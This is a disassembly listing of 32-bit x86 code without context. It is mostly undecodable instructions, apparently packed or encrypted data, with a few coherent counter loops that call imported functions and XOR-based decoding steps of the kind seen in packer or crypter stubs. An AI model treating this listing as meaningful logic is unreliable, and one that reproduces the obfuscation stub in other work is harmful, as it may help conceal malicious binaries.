  407089:	mov    ds:0x77343cd3,eax
  40708e:	and    DWORD PTR [esi-0x13],esp
  407091:	popa   
  407092:	push   eax
  407093:	sbb    ecx,DWORD PTR [edx+0x22]
  407096:	in     eax,dx
  407097:	dec    eax
  407098:	adc    edx,DWORD PTR [ebp-0x37]
  40709b:	je     0x4070d9
  40709d:	lock lods al,BYTE PTR ds:[esi]
  40709f:	mov    edi,0x8220832b
  4070a4:	inc    eax
  4070a5:	dec    esi
  4070a6:	cmp    ah,BYTE PTR ds:0x471ea7d
  4070ac:	aad    0x52
  4070ae:	and    dh,BYTE PTR [edx-0x38]
  4070b1:	repnz call 0xd137:0xe8b88829
  4070b9:	and    dl,BYTE PTR [esi-0xa285aad]
  4070bf:	ds (bad) 
  4070c1:	adc    ebx,esi
  4070c3:	fild   QWORD PTR [ebx-0x24]
  4070c6:	xchg   esi,eax
  4070c7:	mov    bh,0xf8
  4070c9:	mov    ah,0x1e
  4070cb:	imul   esi,DWORD PTR [edi-0x7e],0x1e973b8a
  4070d2:	mov    ah,0x27
  4070d4:	fadd   st,st(1)
  4070d6:	stos   DWORD PTR es:[edi],eax
  4070d7:	je     0x40707f
  4070d9:	aad    0x10
  4070db:	push   ss
  4070dc:	ret    
  4070dd:	aaa    
  4070de:	mov    esp,0x4e511af0
  4070e3:	inc    ebx
  4070e4:	ja     0x4070da
  4070e6:	xor    DWORD PTR [edx],ecx
  4070e8:	xchg   ebp,eax
  4070e9:	(bad)  
  4070ea:	jge    0x407145
  4070ec:	push   es
  4070ed:	sub    DWORD PTR [ecx-0x2324fa7a],ecx
  4070f3:	repnz ficom WORD PTR ds:[edi]
  4070f7:	push   ss
  4070f8:	ss dec ecx
  4070fa:	or     BYTE PTR [eax+0x3],0xdb
  4070fe:	adc    al,0x44
  407100:	add    ebp,DWORD PTR [eax-0x7cd82b3f]
  407106:	cdq    
  407107:	cmp    ecx,edx
  407109:	js     0x4070d3
  40710b:	dec    edx
  40710c:	mov    edi,DWORD PTR [eax]
  40710e:	or     eax,0x3c2b54f9
  407113:	into   
  407114:	mov    esi,0xab5b0e24
  407119:	stc    
  40711a:	aad    0xec
  40711c:	adc    esp,eax
  40711e:	jne    0x4070e6
  407120:	jecxz  0x4070c3
  407122:	mov    bh,0x6d
  407124:	xchg   edx,eax
  407125:	or     DWORD PTR [ebp+0x41],eax
  407128:	xchg   DWORD PTR [ebx-0x3bf7585a],edx
  40712e:	mov    dh,0x9a
  407130:	mov    bl,BYTE PTR [ebx+0x7157b01b]
  407136:	xor    DWORD PTR [eax-0x13],0xffffff92
  40713a:	inc    esp
  40713b:	lods   al,BYTE PTR ds:[esi]
  40713c:	fsub   QWORD PTR [esi+0x48]
  40713f:	mov    eax,ds:0x3fb4f8e0
  407144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407145:	fist   DWORD PTR [edi+0x7bedeb87]
  40714b:	xchg   edx,eax
  40714c:	mov    eax,ds:0x24956ffc
  407151:	ja     0x4070e6
  407153:	mov    edi,0xe1782ddd
  407158:	stc    
  407159:	mov    al,ds:0x6af4b602
  40715e:	sub    ch,al
  407160:	jno    0x407183
  407162:	int    0x89
  407164:	mov    al,0x63
  407166:	push   ss
  407167:	or     BYTE PTR [edx+esi*4+0x138ccab2],bh
  40716e:	mov    al,0x20
  407170:	mov    DWORD PTR [edi],esp
  407172:	outs   dx,BYTE PTR ds:[esi]
  407173:	pop    esp
  407174:	pop    ss
  407175:	sbb    dl,BYTE PTR [ecx-0x12]
  407178:	push   edi
  407179:	ins    BYTE PTR es:[edi],dx
  40717a:	loope  0x40713f
  40717c:	test   al,0xc5
  40717e:	or     BYTE PTR [eax],0x9e
  407181:	push   cs
  407182:	pop    eax
  407183:	add    BYTE PTR [edi+0x31],0x7a
  407187:	pop    ebp
  407188:	pop    esp
  407189:	pop    esp
  40718a:	jecxz  0x407182
  40718c:	and    DWORD PTR [edi],edi
  40718e:	mov    ebp,0x9e10e2c1
  407193:	inc    edx
  407194:	call   0x4cdc4046
  407199:	or     BYTE PTR [ebp-0x71],0x4b
  40719d:	xchg   edx,eax
  40719e:	mov    ds:0x8bc05af5,al
  4071a3:	xchg   edi,eax
  4071a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071a5:	push   0x11
  4071a7:	xchg   ecx,eax
  4071a8:	mov    eax,ds
  4071aa:	pop    edx
  4071ab:	pop    ebp
  4071ac:	jmp    0x407176
  4071ae:	cld    
  4071af:	test   DWORD PTR [ebx+0x7635a3f4],edx
  4071b5:	mov    eax,0xfb88d677
  4071ba:	push   esp
  4071bb:	lods   eax,DWORD PTR ds:[esi]
  4071bc:	aam    0x4e
  4071be:	into   
  4071bf:	sub    DWORD PTR [ebp+eiz*8-0x22187591],esi
  4071c6:	adc    cl,BYTE PTR [eax]
  4071c8:	nop
  4071c9:	xor    BYTE PTR [eax+0x52],0x8a
  4071cd:	sbb    cl,BYTE PTR [ebx-0x4]
  4071d0:	mov    ah,0xed
  4071d2:	ins    DWORD PTR es:[edi],dx
  4071d3:	sar    BYTE PTR [edx+0x7b],0xa0
  4071d7:	int3   
  4071d8:	mov    esi,0xb557c226
  4071dd:	lods   eax,DWORD PTR ds:[esi]
  4071de:	or     ah,BYTE PTR [eax]
  4071e0:	xchg   ecx,eax
  4071e1:	xor    DWORD PTR [edx+0x544bbd52],0x50
  4071e8:	clc    
  4071e9:	or     al,0xd0
  4071eb:	xor    bh,dh
  4071ed:	(bad)  
  4071ee:	sub    DWORD PTR [edi+0x4c4af436],edx
  4071f4:	ror    DWORD PTR [ecx],1
  4071f6:	jecxz  0x4071ef
  4071f8:	clc    
  4071f9:	or     eax,0x330392cc
  4071fe:	dec    ebp
  4071ff:	or     eax,eax
  407201:	add    ebx,ecx
  407203:	inc    ecx
  407204:	jecxz  0x4071ed
  407206:	in     eax,0x52
  407208:	aam    0xd7
  40720a:	cmp    esp,DWORD PTR [eax]
  40720c:	out    dx,eax
  40720d:	or     BYTE PTR [edx],al
  40720f:	mov    ?,esi
  407211:	adc    ch,BYTE PTR [ecx+0x34]
  407214:	arpl   dx,ax
  407216:	scas   eax,DWORD PTR es:[edi]
  407217:	and    BYTE PTR [ebx-0x5762ff80],cl
  40721d:	mov    ah,0x69
  40721f:	xor    cl,BYTE PTR [ebx-0x71]
  407222:	retf   0xa6a5
  407225:	cmp    esp,DWORD PTR [ebx+0xb]
  407228:	mov    eax,ds:0xbc4dc7d7
  40722d:	ds push ss
  40722f:	sbb    eax,0xc2a71186
  407234:	fld    TBYTE PTR [edx+0xa3e89b9]
  40723a:	mov    esp,DWORD PTR [ecx-0x18]
  40723d:	push   ebp
  40723e:	aas    
  40723f:	xor    al,0x2d
  407241:	in     eax,0xb0
  407243:	enter  0x4715,0x84
  407247:	and    eax,0xe969be33
  40724c:	aam    0xfe
  40724e:	push   ebx
  40724f:	test   DWORD PTR ds:0x4d184dc5,ebx
  407255:	leave  
  407256:	jo     0x4071e4
  407258:	(bad)  
  407259:	jbe    0x407213
  40725b:	sub    al,0xe7
  40725d:	jmp    0xe7060bdf
  407262:	les    esi,FWORD PTR [ecx]
  407264:	xchg   esp,eax
  407265:	loopne 0x4072a3
  407267:	cmp    eax,0x3e7f5dd8
  40726c:	loope  0x407238
  40726e:	popf   
  40726f:	loopne 0x407260
  407271:	jb     0x4072bc
  407273:	pop    edi
  407274:	cmp    cl,BYTE PTR [edx+eax*1]
  407277:	popa   
  407278:	adc    BYTE PTR [ebp+0x38],ch
  40727b:	stos   DWORD PTR es:[edi],eax
  40727c:	or     BYTE PTR [eax],ah
  40727e:	inc    esi
  40727f:	inc    ecx
  407280:	mov    ebx,0xc6529ecd
  407285:	cmp    dl,bh
  407287:	out    dx,eax
  407288:	push   ebx
  407289:	dec    ebp
  40728a:	cmp    edx,DWORD PTR [ecx-0x37c88702]
  407290:	ficomp DWORD PTR [edi]
  407292:	stos   DWORD PTR es:[edi],eax
  407293:	sbb    bh,bh
  407295:	jb     0x407267
  407297:	or     DWORD PTR [esi+ebp*1],edi
  40729a:	mov    ch,0x9a
  40729c:	jge    0x4072e1
  40729e:	pop    ecx
  40729f:	arpl   WORD PTR [ebx+0x6d],cx
  4072a2:	jo     0x407225
  4072a4:	adc    BYTE PTR [esi+0x14],dl
  4072a7:	test   al,0xec
  4072a9:	push   ebx
  4072aa:	(bad)  
  4072ab:	stc    
  4072ac:	mov    al,ds:0x432a1f74
  4072b1:	inc    edi
  4072b2:	add    DWORD PTR [ecx+0x20],0x6776a3ed
  4072b9:	adc    al,0x3b
  4072bb:	imul   ebx,DWORD PTR [eax],0x34
  4072be:	(bad)  
  4072bf:	mov    ds:0x3db5348f,eax
  4072c4:	sbb    ebp,edi
  4072c6:	dec    ecx
  4072c7:	inc    esp
  4072c8:	cli    
  4072c9:	xor    BYTE PTR ds:0x2adc740a,0x79
  4072d0:	js     0x40733e
  4072d2:	imul   ebx,DWORD PTR [ebx-0x69],0x879b1046
  4072d9:	cdq    
  4072da:	mov    BYTE PTR [ebp-0x32],bh
  4072dd:	add    eax,0xe1404e9
  4072e2:	leave  
  4072e3:	call   0x73f70a8c
  4072e8:	addr16 mov cl,0xe8
  4072eb:	and    DWORD PTR [edx+0x32bbf33b],edi
  4072f1:	stc    
  4072f2:	mov    bl,0x84
  4072f4:	outs   dx,DWORD PTR ds:[esi]
  4072f5:	clc    
  4072f6:	mov    ebx,0xd64d8c86
  4072fb:	sub    ecx,DWORD PTR [ebx+0x19]
  4072fe:	test   BYTE PTR [eax-0x3d1f26a8],cl
  407304:	lods   eax,DWORD PTR ds:[esi]
  407305:	xor    eax,0x7a01fe94
  40730a:	call   0x17a:0x5d964b14
  407311:	lods   eax,DWORD PTR ds:[esi]
  407312:	mov    ds:0xdde19520,eax
  407317:	adc    ebx,DWORD PTR [esi+0xf]
  40731a:	stos   BYTE PTR es:[edi],al
  40731b:	xchg   esp,eax
  40731c:	cli    
  40731d:	in     al,0x6f
  40731f:	imul   eax,eax,0x45c6853d
  407325:	(bad)  
  407326:	jg     0x4072b5
  407328:	inc    ebp
  407329:	inc    DWORD PTR [ecx+0x42a77925]
  40732f:	add    BYTE PTR [eax],al
  407331:	add    BYTE PTR [eax],al
  407333:	add    cl,ch
  407335:	or     eax,0x8b000000
  40733a:	or     eax,0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x5fbb1953,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x40735e
  4073b7:	xchg   ebx,eax
  4073b8:	(bad)  
  4073b9:	mov    edx,0x74cbe05
  4073be:	mov    dh,0xa7
  4073c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073c1:	push   ds
  4073c2:	push   esi
  4073c3:	inc    eax
  4073c4:	out    0x70,eax
  4073c6:	arpl   WORD PTR [edx+0x39a6dff6],bx
  4073cc:	jp     0x4073f9
  4073ce:	out    dx,eax
  4073cf:	adc    DWORD PTR [ebx-0x36504e2b],0xffffffe2
  4073d6:	addr16 push 0x402127a7
  4073dc:	in     eax,0xb5
  4073de:	(bad)  
  4073df:	sub    eax,0xb5398db1
  4073e4:	adc    eax,DWORD PTR [eax+eiz*2-0x4a]
  4073e8:	mov    eax,ds:0x6d00ff91
  4073ed:	inc    eax
  4073ee:	ins    BYTE PTR es:[edi],dx
  4073ef:	rol    BYTE PTR [eax+0x2c],1
  4073f2:	inc    ebx
  4073f3:	out    dx,eax
  4073f4:	bound  esi,QWORD PTR [ebx-0x4596d55a]
  4073fa:	std    
  4073fb:	test   al,0xe7
  4073fd:	push   ebp
  4073fe:	mov    ds:0x1cf2620f,eax
  407403:	pop    ebp
  407404:	mov    ds:0x91f65b5f,al
  407409:	aas    
  40740a:	or     dl,BYTE PTR [ebp-0x2b3b1100]
  407410:	dec    eax
  407411:	rcr    BYTE PTR [ebx],cl
  407413:	jl     0x40744c
  407415:	jp     0x40745d
  407417:	push   ss
  407418:	outs   dx,BYTE PTR ds:[esi]
  407419:	jge    0x407425
  40741b:	adc    cl,BYTE PTR [edx+0x6e23cba9]
  407421:	inc    esp
  407422:	out    0x16,al
  407424:	pusha  
  407425:	lods   eax,DWORD PTR ds:[esi]
  407426:	adc    al,0xad
  407428:	(bad)  
  407429:	mov    al,BYTE PTR [edx]
  40742b:	mov    BYTE PTR [edx+0x4],ah
  40742e:	das    
  40742f:	in     eax,0x9
  407431:	sub    eax,0x6655f814
  407436:	inc    eax
  407437:	(bad)  
  407438:	cs xchg edi,eax
  40743a:	xchg   edx,eax
  40743b:	sbb    DWORD PTR [eax-0x12],eax
  40743e:	imul   ebp,DWORD PTR [edx+ebp*8-0x17836a93],0xde39fb45
  407449:	dec    ebp
  40744a:	mov    edx,0x2fbb3323
  40744f:	or     edx,edx
  407451:	sbb    eax,DWORD PTR [ebp-0x6465bdc6]
  407457:	sbb    eax,0x255d1793
  40745c:	adc    BYTE PTR [ecx-0x54cc3d14],bl
  407462:	je     0x407444
  407464:	gs scas eax,DWORD PTR es:[edi]
  407466:	aam    0x4
  407468:	dec    edi
  407469:	lods   al,BYTE PTR ds:[esi]
  40746a:	xor    dh,BYTE PTR [ebp-0x6c]
  40746d:	jno    0x40744c
  40746f:	xchg   ecx,eax
  407470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407471:	loope  0x40740e
  407473:	dec    ebx
  407474:	xor    eax,0xbe7a27d4
  407479:	pop    ds
  40747a:	cmp    edx,DWORD PTR [esi-0xa068b06]
  407480:	fsubr  QWORD PTR [edx+0x2d]
  407483:	shl    DWORD PTR [esp+edi*4+0x187774a4],1
  40748a:	popf   
  40748b:	adc    BYTE PTR [edx+esi*2],al
  40748e:	in     al,dx
  40748f:	test   al,0xd3
  407491:	fdiv   DWORD PTR [ebp+edx*2+0x7f]
  407495:	add    eax,0x3ef5e233
  40749a:	add    BYTE PTR [esi],bh
  40749c:	(bad)  
  40749d:	mov    ecx,0xbf1033bb
  4074a2:	xor    edx,0x67ac33e8
  4074a8:	and    eax,DWORD PTR [esp+ebp*4-0x1ecc6419]
  4074af:	repnz mov edx,0x135cf33e
  4074b5:	jge    0x407453
  4074b7:	je     0x4074a4
  4074b9:	mov    bl,0xfa
  4074bb:	scas   eax,DWORD PTR es:[edi]
  4074bc:	pop    di
  4074be:	scas   eax,DWORD PTR es:[edi]
  4074bf:	rcl    DWORD PTR [ecx-0x4c],0xc6
  4074c3:	(bad)  
  4074c4:	fld    QWORD PTR [ebx-0x68]
  4074c7:	retf   
  4074c8:	daa    
  4074c9:	sub    ebx,DWORD PTR [edx-0x9aef0a2]
  4074cf:	jge    0x407536
  4074d1:	push   ecx
  4074d2:	jno    0x407533
  4074d4:	imul   DWORD PTR [eax-0x36a93609]
  4074da:	test   DWORD PTR [eax],edx
  4074dc:	fwait
  4074dd:	mov    ecx,0x21a95181
  4074e2:	jmp    0x407476
  4074e4:	jecxz  0x407504
  4074e6:	xchg   ecx,eax
  4074e7:	out    dx,eax
  4074e8:	adc    al,0xbd
  4074ea:	push   edx
  4074eb:	jmp    0x7370:0x723adcfd
  4074f2:	cld    
  4074f3:	es inc edx
  4074f5:	imul   BYTE PTR [ecx+ebp*2]
  4074f8:	in     eax,0xbb
  4074fa:	repz and esp,0x27
  4074fe:	adc    edi,DWORD PTR [ebp+0x679456d4]
  407504:	mov    ecx,0x8a8b5a12
  407509:	iret   
  40750a:	call   0xe11bb04f
  40750f:	sub    al,0x11
  407511:	fwait
  407512:	out    dx,eax
  407513:	xchg   BYTE PTR [edi-0x7a],cl
  407516:	sub    esi,esp
  407518:	push   ss
  407519:	mov    esp,0xfac90ec4
  40751e:	sbb    eax,0xb709a37f
  407523:	sahf   
  407524:	jmp    0x40758f
  407526:	sub    ch,BYTE PTR [ecx-0x47d430fb]
  40752c:	scas   eax,DWORD PTR es:[edi]
  40752d:	adc    ch,BYTE PTR [edi-0x67]
  407530:	mov    dh,0xdd
  407532:	adc    al,0x9f
  407534:	xchg   ebp,eax
  407535:	call   0x3621:0xc7dcc011
  40753c:	and    eax,0xc7224878
  407541:	repz jecxz 0x40757e
  407544:	xor    edx,0x617aac99
  40754a:	mov    esi,0xa874c571
  40754f:	dec    ecx
  407550:	mov    ecx,0x6f50cf17
  407555:	add    al,0x36
  407557:	add    eax,0x8d3949f2
  40755c:	jmp    0x2cdb408a
  407561:	cld    
  407562:	adc    DWORD PTR [edx-0x1],0x2f
  407566:	xchg   ebp,eax
  407567:	jae    0x4075e3
  407569:	cmp    BYTE PTR [edx+0x2df0f6a6],0xa
  407570:	(bad)  [ebp-0x717cbb30]
  407576:	sub    ebp,DWORD PTR [edi-0x59ceb6ff]
  40757c:	sub    dl,BYTE PTR [ecx-0x7c]
  40757f:	inc    eax
  407580:	adc    edi,eax
  407582:	jge    0x407555
  407584:	pop    esi
  407585:	mov    al,ds:0x41486b7c
  40758a:	inc    esp
  40758b:	adc    bl,0xb8
  40758e:	loop   0x40757e
  407590:	xor    ch,BYTE PTR [eax-0x6b2c577]
  407596:	imul   bl
  407598:	cmp    BYTE PTR [eax+edx*4-0x6c98363a],ch
  40759f:	std    
  4075a0:	bound  esp,QWORD PTR [ebx+0x6ff7937f]
  4075a6:	xor    BYTE PTR [edx+0x7f9f4675],0x12
  4075ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075ae:	or     al,0x69
  4075b0:	sahf   
  4075b1:	outs   dx,BYTE PTR ds:[esi]
  4075b2:	pop    ebp
  4075b3:	ins    BYTE PTR es:[edi],dx
  4075b4:	iret   
  4075b5:	dec    ebp
  4075b6:	ins    BYTE PTR es:[edi],dx
  4075b7:	push   0x77
  4075b9:	or     eax,0xd3667302
  4075be:	dec    ecx
  4075bf:	jp     0x407624
  4075c1:	xor    DWORD PTR [ebx],esp
  4075c3:	loopne 0x40760b
  4075c5:	cmp    eax,0x3460fdac
  4075ca:	jg     0x4075e7
  4075cc:	aaa    
  4075cd:	mov    ebp,0x10230c10
  4075d2:	mov    esi,0xcf35d2e5
  4075d7:	fadd   QWORD PTR [edx+0x70]
  4075da:	mov    ebp,0xb5434699
  4075df:	out    0xc7,al
  4075e1:	mov    BYTE PTR [esi+0x31],0x6c
  4075e5:	pop    ss
  4075e6:	sbb    al,0xe7
  4075e8:	mov    ah,0x8d
  4075ea:	fld    TBYTE PTR ds:0x106c821a
  4075f0:	fstp   TBYTE PTR [ebx-0x78]
  4075f3:	inc    ebp
  4075f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075f5:	fcom   DWORD PTR [edx-0x624335d4]
  4075fb:	jmp    0xa5ba571d
  407600:	bound  ebp,QWORD PTR [eax-0x60]
  407603:	jmp    0x4075cd
  407605:	lea    esp,[edi-0x3f]
  407608:	scas   al,BYTE PTR es:[edi]
  407609:	popa   
  40760a:	jmp    0x40763b
  40760c:	js     0x4075f5
  40760e:	or     DWORD PTR [esi],eax
  407610:	sub    DWORD PTR [edx],edx
  407612:	sub    ah,al
  407614:	mov    edx,DWORD PTR [edx+edi*1+0x5f7e0ea3]
  40761b:	retf   
  40761c:	call   0x1119:0x3148e2e2
  407623:	xor    BYTE PTR [ebx+esi*4+0x7b],ah
  407627:	jno    0x407679
  407629:	aad    0x84
  40762b:	xlat   BYTE PTR ds:[ebx]
  40762c:	pop    esi
  40762d:	fisubr WORD PTR [ecx+0x4f]
  407630:	repnz hlt 
  407632:	or     BYTE PTR ds:0xb4920a68,bl
  407638:	dec    eax
  407639:	imul   ebp,esi,0x9
  40763c:	aas    
  40763d:	sbb    eax,0x8bc1a20c
  407642:	mov    bl,0x44
  407644:	clc    
  407645:	(bad)  
  407646:	cmp    DWORD PTR [edx+0x3c],eax
  407649:	ss aaa 
  40764b:	inc    ecx
  40764c:	lahf   
  40764d:	test   DWORD PTR [ecx+0x70],edx
  407650:	test   al,0x12
  407652:	popa   
  407653:	mov    ds:0x8ac750e3,eax
  407658:	sti    
  407659:	stos   DWORD PTR es:[edi],eax
  40765a:	sbb    BYTE PTR [ecx],0xeb
  40765d:	xchg   ecx,eax
  40765e:	es mov bl,0x91
  407661:	sub    DWORD PTR [ebx],edx
  407663:	push   esi
  407664:	retf   
  407665:	mov    ebp,0xce40cbc3
  40766a:	mov    edi,0xcae763dc
  40766f:	call   0x8c618b0b
  407674:	stos   BYTE PTR es:[edi],al
  407675:	push   ebx
  407676:	mov    al,ds:0x2b25d1b1
  40767b:	test   eax,0x80752e1c
  407680:	inc    ecx
  407681:	jg     0x40768e
  407683:	mov    bh,0x2b
  407685:	ja     0x4076cb
  407687:	xor    eax,0x2286cbdc
  40768c:	arpl   WORD PTR [eax-0x4e],dx
  40768f:	sar    bh,0x63
  407692:	push   ebx
  407693:	mov    eax,ds:0xea5d6bac
  407698:	xchg   ebp,eax
  407699:	js     0x4076ee
  40769b:	in     al,dx
  40769c:	(bad)  
  40769d:	pop    esp
  40769e:	pop    es
  40769f:	cdq    
  4076a0:	xor    dh,BYTE PTR [esi]
  4076a2:	mov    DWORD PTR [ebp-0x10],eax
  4076a5:	mov    al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a761,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx+0x67ae76e8],1
  407796:	enter  0xddfa,0xb0
  40779a:	(bad)  
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x4077a4
  4077a2:	sar    BYTE PTR [ecx-0x49ad73bc],cl
  4077a8:	ret    0x423c
  4077ab:	sbb    al,0xd3
  4077ad:	lea    edx,[edi+0x8204e61]
  4077b3:	jb     0x407773
  4077b5:	and    bl,BYTE PTR [esi]
  4077b7:	lea    eax,[edi-0x51]
  4077ba:	sub    esi,eax
  4077bc:	and    al,0xa0
  4077be:	cmc    
  4077bf:	xchg   ebx,eax
  4077c0:	int    0xd2
  4077c2:	mov    WORD PTR [ebp*8+0x28f755cc],fs
  4077c9:	cdq    
  4077ca:	dec    esi
  4077cb:	inc    ebx
  4077cc:	(bad)  
  4077cd:	xchg   esp,eax
  4077ce:	ds mov dl,0x23
  4077d1:	add    ah,BYTE PTR [eax+0x63]
  4077d4:	das    
  4077d5:	cmp    eax,0x3de9f102
  4077da:	(bad)  
  4077db:	repz (bad) 
  4077dd:	enter  0xe905,0x4e
  4077e1:	(bad)  
  4077e3:	sbb    dl,0x6e
  4077e6:	inc    esp
  4077e7:	and    al,0xe
  4077e9:	adc    al,BYTE PTR [edi]
  4077eb:	mov    eax,0xb492aac8
  4077f0:	shr    DWORD PTR [edi+0x40dd46b3],cl
  4077f6:	sbb    eax,edx
  4077f8:	pop    edi
  4077f9:	sub    ebx,esi
  4077fb:	lea    ebx,[edi]
  4077fd:	dec    ebx
  4077fe:	ret    0xf9f2
  407801:	mov    edx,0xabfec97d
  407806:	cmp    eax,0x6970c0b
  40780b:	adc    BYTE PTR ds:0x22ee8eae,al
  407811:	or     esp,edi
  407813:	sbb    bl,cl
  407815:	fidivr WORD PTR [ebx+0x21e10b6f]
  40781b:	aas    
  40781c:	mov    bh,0x1e
  40781e:	pop    es
  40781f:	out    dx,al
  407820:	rcl    DWORD PTR [esi+0x6261c5d9],0x58
  407827:	mov    ch,BYTE PTR [edx+0x5333d440]
  40782d:	int3   
  40782e:	in     eax,dx
  40782f:	push   edi
  407830:	push   ebx
  407831:	out    dx,al
  407832:	sar    esi,0x13
  407835:	fld    TBYTE PTR [ecx]
  407837:	les    eax,FWORD PTR [ecx]
  407839:	pushf  
  40783a:	inc    edi
  40783b:	in     al,0x72
  40783d:	cmp    esp,esp
  40783f:	inc    edi
  407840:	push   cs
  407841:	(bad)  
  407842:	fidivr WORD PTR [eax+0x42329e90]
  407848:	rsm    
  40784a:	add    DWORD PTR [ecx+0x2a39b477],0xc9cd0255
  407854:	sub    DWORD PTR [ebx-0x6b],eax
  407857:	push   edi
  407858:	and    dh,BYTE PTR [edi+edi*4-0x3ebd794]
  40785f:	stos   BYTE PTR es:[edi],al
  407860:	cmp    esp,DWORD PTR [eax+esi*8-0x5d]
  407864:	scas   al,BYTE PTR es:[edi]
  407865:	(bad)  
  407866:	leave  
  407867:	leave  
  407868:	sbb    ch,BYTE PTR [eax-0x39]
  40786b:	add    eax,0x49c1430e
  407870:	out    dx,al
  407871:	fstp   TBYTE PTR [ebp-0x43]
  407874:	sahf   
  407875:	daa    
  407876:	lds    ecx,FWORD PTR [eax+0x36]
  407879:	lock pop edx
  40787b:	mov    edx,DWORD PTR [edx+ebp*1-0x4]
  40787f:	mov    eax,ds:0x2b4d5588
  407885:	xchg   ebx,eax
  407886:	mov    eax,ds:0xe973e136
  40788b:	std    
  40788c:	push   ebp
  40788d:	sub    cl,BYTE PTR [ebp+0x6026a2b7]
  407893:	jb     0x4078b1
  407895:	ins    DWORD PTR es:[edi],dx
  407896:	popa   
  407897:	call   0x6b3b:0x82364930
  40789e:	cs std 
  4078a0:	cmp    eax,0xdbefb8f6
  4078a5:	and    dh,bh
  4078a7:	inc    eax
  4078a8:	rcl    BYTE PTR [ecx-0x19],0xac
  4078ac:	ret    0x6881
  4078af:	push   ebp
  4078b0:	in     al,dx
  4078b1:	push   eax
  4078b2:	mov    ds:0xc708fa0b,al
  4078b7:	mov    esp,0x10931853
  4078bc:	xchg   ecx,eax
  4078bd:	stc    
  4078be:	xchg   edi,eax
  4078bf:	popf   
  4078c0:	(bad)  
  4078c1:	repz xor eax,0xc0719edc
  4078c7:	push   es
  4078c8:	push   ebp
  4078c9:	push   es
  4078ca:	test   eax,0x8b18e6eb
  4078cf:	jle    0x40785e
  4078d1:	aaa    
  4078d2:	xor    al,0xb4
  4078d4:	mov    al,ds:0xb90e90d
  4078d9:	xchg   ecx,eax
  4078da:	das    
  4078db:	icebp  
  4078dc:	test   cl,al
  4078de:	leave  
  4078df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078e0:	pop    ds
  4078e1:	lds    ebx,FWORD PTR [edx+0x555899c5]
  4078e7:	out    0x8f,eax
  4078e9:	xor    esp,DWORD PTR [esi]
  4078eb:	sub    al,0xec
  4078ed:	sub    DWORD PTR [ecx],ebp
  4078ef:	xchg   ebp,eax
  4078f0:	mov    ebx,0x4a8afef2
  4078f5:	imul   esp,esi,0xbe5819c
  4078fb:	mov    DWORD PTR [edi+0x4e],ebx
  4078fe:	loop   0x4078f4
  407900:	jecxz  0x4078fd
  407902:	xchg   ebp,eax
  407903:	outs   dx,BYTE PTR ds:[esi]
  407904:	xor    ch,ch
  407906:	jmp    0x40790d
  407908:	push   esi
  407909:	jmp    0x40797c
  40790b:	adc    ah,0x1e
